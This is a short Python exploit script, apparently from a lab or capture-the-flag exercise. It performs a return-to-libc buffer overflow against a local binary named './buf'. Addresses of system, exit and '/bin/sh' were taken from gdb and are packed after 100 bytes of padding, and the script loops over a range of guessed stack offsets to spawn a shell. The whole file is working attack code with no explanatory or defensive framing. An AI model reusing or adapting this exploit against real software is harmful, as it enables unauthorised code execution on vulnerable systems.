from struct import pack
from subprocess import call

# junk in same size as buffer
JUNK = str.encode('A'*100)

# everything from here is overflow
# address got by gdb via p system, p exit, find '/bin/sh'
# converts addresses into little endian
SYS = pack('I', 0xf7e106e0)
EXIT = pack('I', 0xf7e02e50)
SH = pack('I', 0xf7f60108)

# rough range
for i in range(0x3b, 0x4a):
    # address got via debugger after stopping where ecx is popped off
    ecx=pack('I', 0xffffcc08 + i)
    payload = JUNK + ecx + SYS + EXIT + SH
    print(hex(i))
    call(['./buf', payload])